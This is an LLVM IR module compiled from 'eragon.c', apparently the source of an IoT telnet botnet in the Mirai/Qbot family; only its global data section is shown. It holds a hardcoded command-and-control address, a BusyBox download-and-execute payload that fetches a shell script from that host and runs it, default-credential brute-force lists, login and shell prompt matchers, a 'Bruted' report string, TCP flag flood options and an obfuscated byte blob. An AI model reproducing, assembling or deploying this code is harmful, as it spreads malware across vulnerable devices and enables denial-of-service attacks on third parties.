; ModuleID = 'host/ir_fla/eragon.ll'
source_filename = "eragon.c"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.hostent = type { i8*, i8**, i32, i32, i8** }
%struct.fd_set = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon }
%union.anon = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.tcp_pseudo = type { i64, i64, i8, i8, i16 }
%struct.udphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon.2 }
%struct.anon.2 = type { i16, i16, i16, i16 }
%struct.anon.3 = type { i16, i16, i16, i16 }
%struct.anon.0 = type { i16, i16, i32, i32, i16, i16, i16, i16 }
%struct.ifreq = type { %union.anon.4, %union.anon.5 }
%union.anon.4 = type { [16 x i8] }
%union.anon.5 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }
%union.anon.6 = type { i32 }

@.str = private unnamed_addr constant [7 x i8] c"x86_64\00", align 1
@.str.1 = private unnamed_addr constant [16 x i8] c"/usr/bin/python\00", align 1
@.str.2 = private unnamed_addr constant [7 x i8] c"SERVER\00", align 1
@.str.3 = private unnamed_addr constant [7 x i8] c"DEVICE\00", align 1
@.str.4 = private unnamed_addr constant [74 x i8] c"Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0\00", align 1
@.str.5 = private unnamed_addr constant [83 x i8] c"Mozilla/5.0 (X11; U; Linux ppc; en-US; rv:1.9a8) Gecko/2007100620 GranParadiso/3.1\00", align 1
@.str.6 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (compatible; U; ABrowse 0.6; Syllable) AppleWebKit/420+ (KHTML, like Gecko)\00", align 1
@.str.7 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en; rv:1.8.1.11) Gecko/20071128 Camino/1.5.4\00", align 1
@.str.8 = private unnamed_addr constant [64 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; rv:2.2) Gecko/20110201\00", align 1
@.str.9 = private unnamed_addr constant [69 x i8] c"Mozilla/5.0 (X11; U; Linux i686; pl-PL; rv:1.9.0.6) Gecko/2009020911\00", align 1
@.str.10 = private unnamed_addr constant [88 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 6.1; cs; rv:1.9.2.6) Gecko/20100628 myibrow/4alpha2\00", align 1
@.str.11 = private unnamed_addr constant [106 x i8] c"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 6.0; MyIE2; SLCC1; .NET CLR 2.0.50727; Media Center PC 5.0)\00", align 1
@.str.12 = private unnamed_addr constant [87 x i8] c"Mozilla/5.0 (Windows; U; Win 9x 4.90; SG; rv:1.9.2.4) Gecko/20101104 Netscape/9.1.0285\00", align 1
@.str.13 = private unnamed_addr constant [80 x i8] c"Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.8) Gecko/20090327 Galeon/2.0.7\00", align 1
@.str.14 = private unnamed_addr constant [34 x i8] c"Mozilla/5.0 (PLAYSTATION 3; 3.55)\00", align 1
@.str.15 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (X11; Linux x86_64; rv:38.0) Gecko/20100101 Thunderbird/38.2.0 Lightning/4.0.2\00", align 1
@.str.16 = private unnamed_addr constant [15 x i8] c"wii libnup/1.0\00", align 1
@.str.17 = private unnamed_addr constant [47 x i8] c"Mozilla/4.0 (PSP (PlayStation Portable); 2.00)\00", align 1
@.str.18 = private unnamed_addr constant [33 x i8] c"PSP (PlayStation Portable); 2.00\00", align 1
@.str.19 = private unnamed_addr constant [34 x i8] c"Bunjalloo/0.7.6(Nintendo DS;U;en)\00", align 1
@.str.20 = private unnamed_addr constant [26 x i8] c"Doris/1.15 [en] (Symbian)\00", align 1
@.str.21 = private unnamed_addr constant [61 x i8] c"BlackBerry7520/4.0.0 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.22 = private unnamed_addr constant [78 x i8] c"BlackBerry9700/5.0.0.743 Profile/MIDP-2.1 Configuration/CLDC-1.1 VendorID/100\00", align 1
@.str.23 = private unnamed_addr constant [73 x i8] c"Opera/9.80 (X11; Linux i686; Ubuntu/14.10) Presto/2.12.388 Version/12.16\00", align 1
@.str.24 = private unnamed_addr constant [60 x i8] c"Opera/9.80 (Windows NT 5.1; U;) Presto/2.7.62 Version/11.01\00", align 1
@.str.25 = private unnamed_addr constant [92 x i8] c"Mozilla/5.0 (X11; Linux x86_64; U; de; rv:1.9.1.6) Gecko/20091201 Firefox/3.5.6 Opera 10.62\00", align 1
@.str.26 = private unnamed_addr constant [101 x i8] c"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36\00", align 1
@.str.27 = private unnamed_addr constant [115 x i8] c"Mozilla/5.0 (Linux; Android 4.4.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/50.0.2661.89 Mobile Safari/537.36\00", align 1
@.str.28 = private unnamed_addr constant [119 x i8] c"Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/1.0.154.39 Safari/525.19\00", align 1
@.str.29 = private unnamed_addr constant [89 x i8] c"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0; Trident/5.0; chromeframe/11.0.696.57)\00", align 1
@.str.30 = private unnamed_addr constant [81 x i8] c"Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.2; SV1; uZardWeb/1.0; Server_JP)\00", align 1
@.str.31 = private unnamed_addr constant [134 x i8] c"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_5_7; en-us) AppleWebKit/530.17 (KHTML, like Gecko) Version/4.0 Safari/530.17 Skyfire/2.0\00", align 1
@.str.32 = private unnamed_addr constant [83 x i8] c"SonyEricssonW800i/R1BD001/SEMC-Browser/4.2 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@.str.33 = private unnamed_addr constant [103 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/4.0; FDM; MSIECrawler; Media Center PC 5.0)\00", align 1
@.str.34 = private unnamed_addr constant [91 x i8] c"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.6; rv:5.0) Gecko/20110517 Firefox/5.0 Fennec/5.0\00", align 1
@.str.35 = private unnamed_addr constant [80 x i8] c"Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; FunWebProducts)\00", align 1
@.str.36 = private unnamed_addr constant [67 x i8] c"MOT-V300/0B.09.19R MIB/2.2 Profile/MIDP-2.0 Configuration/CLDC-1.0\00", align 1
@.str.37 = private unnamed_addr constant [82 x i8] c"Mozilla/5.0 (Android; Linux armv7l; rv:9.0) Gecko/20111216 Firefox/9.0 Fennec/9.0\00", align 1
@.str.38 = private unnamed_addr constant [75 x i8] c"Mozilla/5.0 (compatible; Teleca Q7; Brew 3.1.5; U; en) 480X800 LGE VX11000\00", align 1
@.str.39 = private unnamed_addr constant [67 x i8] c"MOT-L7/08.B7.ACR MIB/2.2.1 Profile/MIDP-2.0 Configuration/CLDC-1.1\00", align 1
@useragents = global [36 x i8*] [i8* getelementptr inbounds ([74 x i8], [74 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([64 x i8], [64 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([69 x i8], [69 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([88 x i8], [88 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([106 x i8], [106 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([87 x i8], [87 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([34 x i8], [34 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([26 x i8], [26 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([61 x i8], [61 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([78 x i8], [78 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([73 x i8], [73 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([60 x i8], [60 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([92 x i8], [92 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([101 x i8], [101 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([115 x i8], [115 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([119 x i8], [119 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([89 x i8], [89 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([81 x i8], [81 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([134 x i8], [134 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([83 x i8], [83 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([103 x i8], [103 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([91 x i8], [91 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([80 x i8], [80 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([82 x i8], [82 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([75 x i8], [75 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([67 x i8], [67 x i8]* @.str.39, i32 0, i32 0)], align 16
@.str.40 = private unnamed_addr constant [15 x i8] c"185.52.1.73:27\00", align 1
@ServerInfo = global [1 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.40, i32 0, i32 0)], align 8
@.str.41 = private unnamed_addr constant [117 x i8] c"cd /tmp; /bin/busybox wget http://185.52.1.73/bins.sh -O - > jeSjax; /bin/busybox chmod 777 jeSjax; sh /tmp/jeSjax\0D\0A\00", align 1
@BusyBoxPayload = global i8* getelementptr inbounds ([117 x i8], [117 x i8]* @.str.41, i32 0, i32 0), align 8
@.str.42 = private unnamed_addr constant [6 x i8] c"root\00\00", align 1
@.str.43 = private unnamed_addr constant [7 x i8] c"admin\00\00", align 1
@.str.44 = private unnamed_addr constant [10 x i8] c"volition\00\00", align 1
@.str.45 = private unnamed_addr constant [8 x i8] c"daemon\00\00", align 1
@.str.46 = private unnamed_addr constant [20 x i8] c"support\00supervisor\00\00", align 1
@.str.47 = private unnamed_addr constant [7 x i8] c"guest\00\00", align 1
@.str.48 = private unnamed_addr constant [9 x i8] c"default\00\00", align 1
@.str.49 = private unnamed_addr constant [8 x i8] c"telnet\00\00", align 1
@.str.50 = private unnamed_addr constant [6 x i8] c"ubnt\00\00", align 1
@.str.51 = private unnamed_addr constant [9 x i8] c"usuario\00\00", align 1
@.str.52 = private unnamed_addr constant [6 x i8] c"user\00\00", align 1
@usernames = global [36 x i8*] [i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0)], align 16
@.str.53 = private unnamed_addr constant [2 x i8] zeroinitializer, align 1
@.str.54 = private unnamed_addr constant [18 x i8] c"support\00zyad1234\00\00", align 1
@.str.55 = private unnamed_addr constant [6 x i8] c"anko\00\00", align 1
@.str.56 = private unnamed_addr constant [8 x i8] c"123456\00\00", align 1
@.str.57 = private unnamed_addr constant [10 x i8] c"changeme\00\00", align 1
@.str.58 = private unnamed_addr constant [10 x i8] c"hunt5759\00\00", align 1
@.str.59 = private unnamed_addr constant [5 x i8] c"5up\00\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"password\00\00", align 1
@.str.61 = private unnamed_addr constant [6 x i8] c"1234\00\00", align 1
@.str.62 = private unnamed_addr constant [8 x i8] c"xc3511\00\00", align 1
@.str.63 = private unnamed_addr constant [10 x i8] c"zsun1188\00\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"awind5885\00\00", align 1
@.str.65 = private unnamed_addr constant [8 x i8] c"hi3518\00\00", align 1
@.str.66 = private unnamed_addr constant [11 x i8] c"a6a7wimax\00\00", align 1
@.str.67 = private unnamed_addr constant [8 x i8] c"radius\00\00", align 1
@.str.68 = private unnamed_addr constant [8 x i8] c"calvin\00\00", align 1
@.str.69 = private unnamed_addr constant [6 x i8] c"tech\00\00", align 1
@.str.70 = private unnamed_addr constant [9 x i8] c"aquario\00\00", align 1
@.str.71 = private unnamed_addr constant [8 x i8] c"asante\00\00", align 1
@.str.72 = private unnamed_addr constant [18 x i8] c"vertex25ektks123\00\00", align 1
@.str.73 = private unnamed_addr constant [9 x i8] c"cat1029\00\00", align 1
@passwords = global [36 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.73, i32 0, i32 0)], align 16
@.str.74 = private unnamed_addr constant [15 x i8] c"/dev/netslink/\00", align 1
@.str.75 = private unnamed_addr constant [6 x i8] c"/tmp/\00", align 1
@.str.76 = private unnamed_addr constant [6 x i8] c"/var/\00", align 1
@.str.77 = private unnamed_addr constant [6 x i8] c"/dev/\00", align 1
@.str.78 = private unnamed_addr constant [10 x i8] c"/var/run/\00", align 1
@.str.79 = private unnamed_addr constant [10 x i8] c"/dev/shm/\00", align 1
@.str.80 = private unnamed_addr constant [6 x i8] c"/mnt/\00", align 1
@.str.81 = private unnamed_addr constant [7 x i8] c"/boot/\00", align 1
@.str.82 = private unnamed_addr constant [6 x i8] c"/usr/\00", align 1
@.str.83 = private unnamed_addr constant [6 x i8] c"/opt/\00", align 1
@tmpdirs = global [11 x i8*] [i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.83, i32 0, i32 0), i8* null], align 16
@.str.84 = private unnamed_addr constant [2 x i8] c":\00", align 1
@.str.85 = private unnamed_addr constant [5 x i8] c"ogin\00", align 1
@.str.86 = private unnamed_addr constant [8 x i8] c"sername\00", align 1
@.str.87 = private unnamed_addr constant [8 x i8] c"assword\00", align 1
@advances = global [5 x i8*] [i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.87, i32 0, i32 0), i8* null], align 16
@.str.88 = private unnamed_addr constant [7 x i8] c"nvalid\00", align 1
@.str.89 = private unnamed_addr constant [6 x i8] c"ailed\00", align 1
@.str.90 = private unnamed_addr constant [9 x i8] c"ncorrect\00", align 1
@.str.91 = private unnamed_addr constant [6 x i8] c"enied\00", align 1
@.str.92 = private unnamed_addr constant [5 x i8] c"rror\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"oodbye\00", align 1
@.str.94 = private unnamed_addr constant [4 x i8] c"bad\00", align 1
@fails = global [8 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0), i8* null], align 16
@.str.95 = private unnamed_addr constant [8 x i8] c"busybox\00", align 1
@.str.96 = private unnamed_addr constant [2 x i8] c"$\00", align 1
@.str.97 = private unnamed_addr constant [2 x i8] c"#\00", align 1
@successes = global [4 x i8*] [i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* null], align 16
@advances2 = global [11 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.97, i32 0, i32 0), i8* null], align 16
@botnetServer = global i32 -1, align 4
@numpids = global i64 0, align 8
@macAddress = global [6 x i8] zeroinitializer, align 1
@KadenCommStock = global i32 0, align 4
@Q = internal global [4096 x i32] zeroinitializer, align 16
@rand_cmwc.i = internal global i32 4095, align 4
@c = internal global i32 362436, align 4
@x = internal global i32 0, align 4
@y = internal global i32 0, align 4
@z = internal global i32 0, align 4
@w = internal global i32 0, align 4
@rand_alphastr.alphaset = internal constant [32 x i8] c"kt8lmno5abghiiosdf63rlrs83rs9j0\00", align 16
@pids = common global i32* null, align 8
@.str.98 = private unnamed_addr constant [7 x i8] c":>%$#\00\00", align 1
@GIP.ipState = internal global [4 x i8] zeroinitializer, align 1
@.str.99 = private unnamed_addr constant [12 x i8] c"%d.%d.%d.%d\00", align 1
@ourIP = common global %struct.in_addr zeroinitializer, align 4
@.str.100 = private unnamed_addr constant [3 x i8] c"\0D\0A\00", align 1
@.str.101 = private unnamed_addr constant [20 x i8] c"Eragon Bruted -> %s\00", align 1
@.str.102 = private unnamed_addr constant [5 x i8] c"sh\0D\0A\00", align 1
@.str.103 = private unnamed_addr constant [8 x i8] c"shell\0D\0A\00", align 1
@.str.104 = private unnamed_addr constant [64 x i8] c"%s %s HTTP/1.1\0D\0AHost: %s\0D\0AUser-Agent: %s\0D\0AConnection: close\0D\0A\0D\0A\00", align 1
@.str.105 = private unnamed_addr constant [265 x i8] c"\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\84\8B\87\8F\99\8F\98\9C\8F\98\EA\00", align 1
@.str.106 = private unnamed_addr constant [27 x i8] c"Failed opening raw socket.\00", align 1
@.str.107 = private unnamed_addr constant [33 x i8] c"Failed setting raw headers mode.\00", align 1
@.str.108 = private unnamed_addr constant [4 x i8] c"all\00", align 1
@.str.109 = private unnamed_addr constant [2 x i8] c",\00", align 1
@.str.110 = private unnamed_addr constant [4 x i8] c"syn\00", align 1
@.str.111 = private unnamed_addr constant [4 x i8] c"rst\00", align 1
@.str.112 = private unnamed_addr constant [4 x i8] c"fin\00", align 1
@.str.113 = private unnamed_addr constant [4 x i8] c"ack\00", align 1
@.str.114 = private unnamed_addr constant [4 x i8] c"psh\00", align 1
@.str.115 = private unnamed_addr constant [18 x i8] c"Invalid flag \22%s\22\00", align 1
@.str.116 = private unnamed_addr constant [16 x i8] c"VSzNC0CJti3ouku\00", align 1
@.str.117 = private unnamed_addr constant [16 x i8] c"yhJyMAqx7DZa0kg\00", align 1
@.str.118 = private unnamed_addr constant [16 x i8] c"1Cp9MEDMN6B5L1K\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"miraiMIRAI\00", align 1
@.str.120 = private unnamed_addr constant [10 x i8] c"stdflood4\00", align 1
@.str.121 = private unnamed_addr constant [11 x i8] c"7XLPHoxkvL\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"jmQvYBdRZA\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"eNxERkyrfR\00", align 1
@.str.124 = private unnamed_addr constant [11 x i8] c"qHjTXcMbzH\00", align 1
@.str.125 = private unnamed_addr constant [15 x i8] c"chickennuggets\00", align 1
@.str.126 = private unnamed_addr constant [13 x i8] c"ilovecocaine\00", align 1
@.str.127 = private unnamed_addr constant [7 x i8] c"666666\00", align 1
@.str.128 = private unnamed_addr constant [9 x i8] c"88888888\00", align 1
